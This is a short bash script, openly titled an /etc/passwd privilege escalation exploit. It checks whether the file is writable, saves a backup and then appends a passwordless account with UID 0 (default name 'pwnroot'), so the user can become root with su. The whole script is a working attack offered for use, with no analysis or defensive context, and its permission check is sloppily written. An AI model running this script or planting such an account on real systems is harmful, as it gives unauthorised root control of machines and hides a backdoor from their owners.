#!/bin/bash
# /etc/passwd Privilege Escalation Exploit
# Usage: ./exploit.sh [username]

set -e

USERNAME=${1:-"pwnroot"}
BACKUP_FILE="/tmp/passwd.bak.$(date +%s)"

echo "[*] Checking /etc/passwd permissions..."
perms=$(stat -c "%a" /etc/passwd 2>/dev/null || stat -f "%p" /etc/passwd | sed 's/.*//')

if [[ ! "$perms" =~ .*[2-7][2-7][2-7].* ]]; then
    echo "[-] /etc/passwd is not world-writable (perms: $perms)"
    echo "[-] Exploit failed"
    exit 1
fi

echo "[+] /etc/passwd is world-writable (perms: $perms)"

# Backup original
echo "[*] Backing up /etc/passwd to $BACKUP_FILE"
cp /etc/passwd "$BACKUP_FILE"

# Add malicious entry
echo "[*] Adding root user '$USERNAME' to /etc/passwd"
echo "$USERNAME::0:0:Privileged User:/root:/bin/bash" >> /etc/passwd

echo "[+] Exploit complete!"
echo "[+] Switch to root with: su - $USERNAME"
echo "[*] Backup saved to: $BACKUP_FILE"
echo "[*] To clean up: sed -i '/^$USERNAME:/d' /etc/passwd"
